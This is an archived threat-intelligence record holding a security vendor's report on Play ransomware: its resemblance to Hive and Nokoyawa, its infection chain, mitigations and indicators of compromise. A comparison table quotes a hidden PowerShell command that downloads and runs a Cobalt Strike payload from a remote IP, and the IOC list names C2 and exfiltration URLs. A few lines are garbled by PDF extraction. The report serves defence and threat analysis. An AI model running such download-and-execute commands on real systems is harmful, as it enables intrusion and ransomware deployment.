{
    "id": "a57ae797-0280-432c-8914-1640c3c0a6e0",
    "created_at": "2023-01-12T15:04:41.04883Z",
    "updated_at": "2025-03-27T02:16:25.673705Z",
    "deleted_at": null,
    "sha1_hash": "57e48b6493dc5099fadc8c3d993c4784b61f4c26",
    "title": "2022-09-06 - Play Ransomware's Attack Playbook Similar to that of Hive, Nokoyawa",
    "authors": "",
    "file_creation_date": "2022-09-12T12:02:29Z",
    "file_modification_date": "2022-09-12T12:02:29Z",
    "file_size": 424293,
    "plain_text": "# Play Ransomware's Attack Playbook Similar to that of Hive, Nokoyawa\n\n**[trendmicro.com/en_us/research/22/i/play-ransomware-s-attack-playbook-unmasks-it-as-another-hive-aff.html](https://www.trendmicro.com/en_us/research/22/i/play-ransomware-s-attack-playbook-unmasks-it-as-another-hive-aff.html)**\n\nFigure 1. Play ransomware’s ransom note\n\n\nSeptember 6, 2022\n\n\nIn July, we investigated a spate of [ransomware cases in the Latin American region that targeted government entitles, which was initially](https://www.trendmicro.com/vinfo/us/security/definition/ransomware)\nattributed to a new player known as Play ransomware. This ransomware’s name was derived from its behavior, as it adds the extension “.play”\nafter encrypting files. Its ransom note also contains the single word, “PLAY,” and the ransomware group’s contact email address (Figure 1).\n[Victims of this ransomware first surfaced in Bleeping Computer forums in June 2022. A month later, more details about Play ransomware were](https://www.bleepingcomputer.com/forums/t/773651/play-ransomware-play-support-topic/)\n[published on the “No-logs No breach” website.](https://nologs-nobreach.com/2022/07/24/play-ransomware/)\n\nFurther analysis of these ransomware infections, however, revealed that Play uses many tactics that follow the playbook of both Hive and\nNokoyawa ransomware (Tables 1 and 2), including similarities in the file names and file paths of their respective tools and payloads. Earlier\n[this year, we found evidence that suggests that the attackers behind Nokayawa are related to those behind Hive, owing to the many similarities](https://www.trendmicro.com/en_us/research/22/c/nokoyawa-ransomware-possibly-related-to-hive-.html)\nbetween their attack chains.\n\n[Notably, one behavior that sets Play ransomware apart from Hive and Nokoyawa is its use of AdFind, a command-line query tool capable of](https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-hive)\ncollecting information from Active Directory (AD), as means of discovery (Figure 2). Hive, on the other hand, has been observed using tools\n[like the TrojanSpy.DATASPY trojan to gather information in a victim’s system.](https://www.trendmicro.com/vinfo/ph/threat-encyclopedia/malware/TrojanSpy.PS1.DATASPY.A/)\n\n**Indicator** **Purpose** **Nokoyawa and Hive ransomware** **Play ransomware**\n\nNekto/PriviCMD Privilege escalation ✓ ✓\n\nCobalt Strike Staging ✓ ✓\n\nCoroxy/SystemBC Remote access ✓ ✓\n\nGMER Defense evasion ✓ ✓\n\nPCHunter Discovery and defense evasion ✓\n\nAdFind Discovery ✓\n\nPowerShell scripts Discovery ✓\n\nPsExec Lateral deployment of ransomware ✓ ✓\n\nTable 1. A comparison of similarities in the overall flow and behavior of the Play and Nokoyawa/Hive ransomware families\n\n**Tactic/Tools** **Nokoyawa and Hive ransomware** **Play ransomware**\n\nNekto/PriviCMD _%public%\\Music\\svhost.exe_ _%userprofile%\\Music\\t2747.e_\n\n\nCobalt Strike\ndownload\n\n\n**_-nop -w hidden -c \"IEX ((new-object_**\n**_net.webclient).downloadstring('_hxxp://185.150.117[.]186:80/asdfgsdhsdfgsdfg'))\"_**\n\n\n**_-nop -w hidden -c \"IEX ((new-obj_**\n**_net.webclient).downloadstring('h_**\n\n_%public%\\Music\\soks.exe_\n\n_C:\\PerfLogs\\xxx.exe_\n_%mytemp%\\xxx.exe_\n\n\nCoroxy/SystemBC _%userprofile\\Pictures\\socks.exe_\n_%systemroot%\\System32\\sok.exe_\n\n\nRansomware\ndeployment\n\n\n_C:\\PerfLogs\\xxx.exe_\n_%mytemp%\\xxx.exe_\n\n\nTargets Most targets are in Latin America Most targets are in Latin Ame\n\nTable 2. A comparison of tools and tactics in the attacks of Play and Nokoyawa/Hive ransomware families\n\n\n-----\n\nFigure 2. Play ransomware’s use of AdFind\n\nRelated Malware Campaigns\n\nThough not all of the Play ransomware infections that we analyzed shared malware indicators with that of Hive and Nokoyawa ransomware,\ntheir many shared tactics and tools suggest a high probability of affiliation between these ransomware families. This ransomware merits further\ninvestigation, and we plan on validating the related URLs from Play ransomware infections in terms of watermarking. This is to determine\nwhether these were indeed related to any Hive infections in the past, as was done previously with Nokoyawa infections.\n\n[Additionally, we have found evidence that points to a possible connection between Play ransomware and Quantum ransomware, which is an](https://www.bleepingcomputer.com/news/security/quantum-ransomware-attack-disrupts-govt-agency-in-dominican-republic/)\n[offshoot of the notorious Conti ransomware group. The Cobalt Strike beacons that were used in Play's attacks bear the same watermark,](https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-conti)\n206546002, as those previously dropped by Emotet and SVCReady botnets that have also been observed in Quantum ransomware attacks.\nThis suggests that the two ransomware groups share some of the same infrastructure.\n\nDuring our investigation, we found indicators of a good chance of an Emotet infection. Though there are currently no spam campaigns using\nthe Emotet trojan, we did detect a few cases of Emotet being used to deploy Cobalt Strike beacons bearing the same 206546002 watermark\nthat was found in beacons involved in Play's ransomware attacks.\n\nInfection Routine\n\nThe malware authors behind Play ransomware have been known to use compromised valid accounts or exploit unpatched Fortinet SSL VPN\nvulnerabilities to gain access to an organization’s network (Figure 3). Like most modern ransomware, Play uses living-off-the-land binaries\n(LOLBins) as part of its attacks: For example, it uses the remote tool WinSCP for data exfiltration, and Task Manager for Local Security\nAuthority Server Service (LSASS) process dumping and credential cracking.\n\nPlay ransomware also uses double extortion techniques against its victims. In its attacks, data exfiltration is performed prior to the deployment\nof the ransomware: It archives a victim’s files using WinRAR and then uploads the files to sharing sites. The ransomware executable is\ndistributed via Group Policy Objects (GPO), then run using scheduled tasks, PsExec or wmic.\n\n\n-----\n\nFigure 3. Play ransomware’s infection chain\n**Initial Access**\n\nPlay’s ransomware actors commonly gain initial access through valid accounts that have been reused across multiple platforms, have\npreviously been exposed, or were obtained through illegal means. This includes Virtual Private Network (VPN) accounts, not just domain and\nlocal accounts. Exposed RDP servers are also abused to establish a foothold. Another technique Play ransomware uses is the exploitation of\n[the FortiOS vulnerabilities CVE-2018-13379 and](https://nvd.nist.gov/vuln/detail/CVE-2018-13379) [CVE-2020-12812.](https://nvd.nist.gov/vuln/detail/CVE-2020-12812)\n\nCVE-2018-13379 is a path traversal vulnerability in the FortiOS SSL VPN web portal that allows an unauthenticated attacker to download OS\nsystem files through specially crafted HTTP resource requests. On the other hand, CVE-2020-12812 is an improper-authentication\nvulnerability in SSL VPN in FortiOS, which allows a user to log in without being prompted for FortiToken, the second factor of authentication, if\nthey changed the case of their username.\n\n**Execution**\n\nWe observed Play ransomware’s usage of scheduled tasks and PsExec during its execution phase. Another one of Play’s techniques involves\nthe creation of a GPO, as GPOs are able to control many user and machine settings in the AD. The GPO deploys a scheduled task across the\nAD environment, and the task executes the ransomware at a specific date and time.\n\nThe ransomware also uses batch files to execute PsExec, a legitimate Windows tool in the SysInternals suite. This tool’s ability to execute\nprocesses on other systems allows the rapid spread of the ransomware and assists Play in its reconnaissance activities.\n\n**Persistence**\n\nAfter the Play ransomware actors gain initial access through valid accounts, they will continue to use these accounts as a persistence\nmechanism. If Remote Desktop Protocol (RDP) access is disabled in a victim’s system, the malicious actors will enable it by executing “netsh”\ncommands so that they can establish inbound connections within a victim’s system. The ransomware executable is dropped in the Domain\n\n\n-----\n\nCo t o e s a ed o de s ( OGO o S S O ) a d s u by a sc edu ed tas / s ec, a te c e c ypt o o t e ct s es ta es\nplace.\n\n**Privilege Escalation**\n\n[Play ransomware uses Mimikatz to extract high privileges credentials from memory. Afterward, the ransomware will add accounts to privileged](https://attack.mitre.org/software/S0002/)\ngroups, one of which is the Domain Administrators group. It performs vulnerability enumeration through Windows Privilege Escalation\nAwesome Scripts (WinPEAS), a script that searches for possible local privilege escalation paths.\n\n**Defense Evasion**\n\n[The ransomware uses tools such as Process Hacker,](https://processhacker.sourceforge.io/) [GMER,](http://www.gmer.net/) [IOBit, and](https://www.iobit.com/pt/index.php) [PowerTool to disable antimalware and monitoring solutions. It covers](https://www.softpedia.com/get/Antivirus/Removal-Tools/ithurricane-PowerTool.shtml)\nits tracks using the Windows built-in tool wevtutil or a batch script, which will remove indicators of its presence, such as logs in Windows Event\nLogs or malicious files. It disables Windows Defender protection capabilities through PowerShell or command prompt. The PowerShell scripts\nthat Play ransomware uses, like Cobalt Strike beacons (Cobeacon) or Empire agents, are encrypted in Base64.\n\n**Credential Access**\n\nPlay ransomware also uses Mimikatz to dump credentials. The tool can be dropped directly on the target host or executed as a module\nthrough a command-and-control (C&C) application like Empire or Cobalt Strike. We also observed the malware’s use of the Windows tool Task\nManager to dump the LSASS process from memory.\n\n**Discovery**\n\nDuring the discovery phase, the ransomware actors collect more details about the AD environment. We’ve observed that AD queries for\nremote systems have been performed by different tools, such as [ADFind,](https://attack.mitre.org/software/S0552/) [Microsoft Nltest, and](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11)) [Bloodhound. Enumeration of system](https://attack.mitre.org/software/S0521/)\ninformation such as hostnames, shares, and domain information were also performed by the threat actor.\n\n**Lateral Movement**\n\nPlay ransomware may use different tools to move laterally across a victim’s system:\n\n[Cobalt Strike SMB beacon is used as a C&C beacon, a method of lateral movement, and a tool for downloading and executing files](https://attack.mitre.org/software/S0154/)\n[SystemBC, a SOCKS5 proxy bot that acts as a backdoor with the ability to communicate over TOR, is used for backdooring mechanisms](https://news.sophos.com/en-us/2020/12/16/systembc/)\n[Empire is an open-source post-exploitation framework used to conduct Play ransomware’s post-exploitation activity](https://attack.mitre.org/software/S0363/)\n[Mimikatz is used to dump credentials and gain domain administrator access on victim networks to conduct lateral movement.](https://github.com/gentilkiwi/mimikatz)\n\n**Exfiltration**\n\nA victim’s data is often split into chunks instead of whole files prior to its exfiltration, an approach that Play ransomware may use to avoid\ntriggering network data transfer. The ransomware actors use WinSCP, an SFTP client and FTP client for Microsoft Windows. They also use\nWinRAR to compress the files in .RAR format for later exfiltration. We were able to identify a web page developed in PHP that is used to\nreceive the exfiltrated files.\n\n**Impact**\n\nAs mentioned earlier, after the ransomware encrypts a file, it adds the extension “.play” to that file. A ransom note, ReadMe.txt, is created in\nthe hard drive root (C:). In all the cases we investigated, the ransom notes contained an email address following this format: [seven random\n_characters]@gmx[.]com._\n\nInfection Distribution\n\nLike Hive and Nokoyawa ransomware, most of Play ransomware’s attacks affected organizations located in the Latin American region, with\nBrazil topping the list. Organizations in Argentina, Hungary, India, the Netherlands, and Spain also experienced Play attacks.\n\nSecurity Recommendations\n\nThe results of our investigation into Play ransomware’s attacks highlight the evolution of threats that are designed to evade detection.\nOrganizations should be wary of malicious actors using red-team or penetration-testing tools to blend in with a targeted system’s environment.\n\nEnd users and organizations alike can mitigate the risk of infection from ransomware like Play by following these security best practices:\n\nEnable multifactor authentication (MFA) to prevent attackers from performing lateral movement inside a network.\n[Adhere to the 3-2-1 rule when backing up important files. This involves creating three backup copies on two different file formats, with](https://www.trendmicro.com/vinfo/ph/security/news/virtualization-and-cloud/best-practices-backing-up-data)\none of the copies stored in a separate location.\n[Patch and update systems regularly. It’s important to keep operating systems and applications up to date and maintain patch](https://www.trendmicro.com/vinfo/ph/security/news/vulnerabilities-and-exploits/virtual-patching-patch-those-vulnerabilities-before-they-can-be-exploited)\nmanagement protocols that can deter malicious actors from exploiting any software vulnerabilities.\n\n\n-----\n\nUse s a d o ga at o s ca be e t o t e use o u t aye ed detect o a d espo se so ut o s suc as e d c o s o O e, c\nprovides powerful XDR capabilities that collect and automatically correlate data across multiple security layers — email, endpoints, servers,\ncloud workloads, and networks — to prevent attacks via automated protection, while also ensuring that no significant incidents go unnoticed.\n[Trend Micro Apex One™ also provides next-level automated threat detection and response to protect endpoints against advanced issues, like](https://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint.html)\nhuman-operated ransomware.\n\nIndicators of Compromise (IOCs)\n\n**Hashes**\n\n**SHA-256** **Detection** **Description**\n\nfc2b98c4f03a246f6564cc778c03f1f9057510efb578ed3e9d8e8b0e5516bd49 Trojan.Win64.PRIVICMD.YXCHW PRIVICMD/NEKTO\n\nc316627897a78558356662a6c64621ae25c3c3893f4b363a4b3f27086246038d Backdoor.Win32.COBEACON.YXCH3 Cobalt Strike\n\nc92c158d7c37fea795114fa6491fe5f145ad2f8c08776b18ae79db811e8e36a3 PUA.Win32.AdFind.A AdFind\n\ne1c75f863749a522b244bfa09fb694b0cc2ae0048b4ab72cb74fcf73d971777b Trojan.BAT.ADFIND.YECGUT AdFind Command\nLines\n\n094d1476331d6f693f1d546b53f1c1a42863e6cde014e2ed655f3cbe63e5ecde HackTool.Win32.ToolPow.SM PowerTool\n\ne8a3e804a96c716a3e9b69195db6ffb0d33e2433af871e4d4e1eab3097237173 PUA.Win32.GMER.YABBI GMER\n\nd4a0fe56316a2c45b9ba9ac1005363309a3edc7acf9e4df64d326a0ff273e80f PUA.Win32.ProcHack.C Process Hacker\n\nc88b284bac8cd639861c6f364808fac2594f0069208e756d2f66f943a23e3022 Backdoor.Win32.SYSTEMBC.YXCFLZ Coroxy/SystemBC\n\nf18bc899bcacd28aaa016d220ea8df4db540795e588f8887fe8ee9b697ef819f Ransom.Win32.PLAYCRYPT.YECGUT Play ransomware\n\ne641b622b1f180fe189e3f39b3466b16ca5040b5a1869e5d30c92cca5727d3f0 Ransom.Win32.PLAYDE.A Play ransomware\n\n608e2b023dc8f7e02ae2000fc7dbfc24e47807d1e4264cbd6bb5839c81f91934 Ransom.Win32.PLAYDE.YXCHJT Play ransomware\n\n006ae41910887f0811a3ba2868ef9576bbd265216554850112319af878f06e55 Ransom.Win32.PLAYDE.YXCHJT Play ransomware\n\ne4f32fe39ce7f9f293ccbfde30adfdc36caf7cfb6ccc396870527f45534b840b Ransom.Win32.PLAYDE.YXCHJT Play ransomware\n\n8962de34e5d63228d5ab037c87262e5b13bb9c17e73e5db7d6be4212d66f1c22 Ransom.Win32.PLAYDE.YXCHJT Play ransomware\n\n5573cbe13c0dbfd3d0e467b9907f3a89c1c133c774ada906ea256e228ae885d5 Ransom.Win32.PLAYDE.YXCHJT Play ransomware\n\nf6072ff57c1cfe74b88f521d70c524bcbbb60c561705e9febe033f51131be408 Ransom.Win32.PLAYDE.YXCHJT Play ransomware\n\n7d14b98cdc1b898bd0d9be80398fc59ab560e8c44e0a9dedac8ad4ece3d450b0 Ransom.Win32.PLAYDE.YXCHJT Play ransomware\n\ndcaf62ee4637397b2aaa73dbe41cfb514c71565f1d4770944c9b678cd2545087 Ransom.Win32.PLAYDE.YXCHJT Play ransomware\n\nf5c2391dbd7ebb28d36d7089ef04f1bd9d366a31e3902abed1755708207498c0 Ransom.Win32.PLAYDE.YACHWT Play ransomware\n\n3e6317229d122073f57264d6f69ae3e145decad3666ddad8173c942e80588e69 Ransom.Win32.PLAYDE.YACHP Play ransomware\n\n**URLs**\n\n**URL** **Description**\n\n\n-----\n\nhxxp://84.32.190[.]37:80/ahgffxvbghgfv Cobalt Strike download\n\nhxxp://newspraize[.]com Cobalt Strike C&C\n\nhxxp://realmacnow[.]com Cobalt Strike C&C\n\n172.67.176[.]244 Cobalt Strike C&C\n\n104.21.43[.]80 Cobalt Strike C&C\n\nhxxp://67.205.182[.]129/u2/upload[.]php Exfiltration C&C Server\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-06 - Play Ransomware's Attack Playbook Similar to that of Hive, Nokoyawa.pdf"
    ],
    "report_names": [
        "2022-09-06 - Play Ransomware's Attack Playbook Similar to that of Hive, Nokoyawa.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535881,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1662984149,
    "ts_modification_date": 1662984149,
    "files": {
        "pdf": "https://archive.orkl.eu/57e48b6493dc5099fadc8c3d993c4784b61f4c26.pdf",
        "text": "https://archive.orkl.eu/57e48b6493dc5099fadc8c3d993c4784b61f4c26.txt",
        "img": "https://archive.orkl.eu/57e48b6493dc5099fadc8c3d993c4784b61f4c26.jpg"
    }
}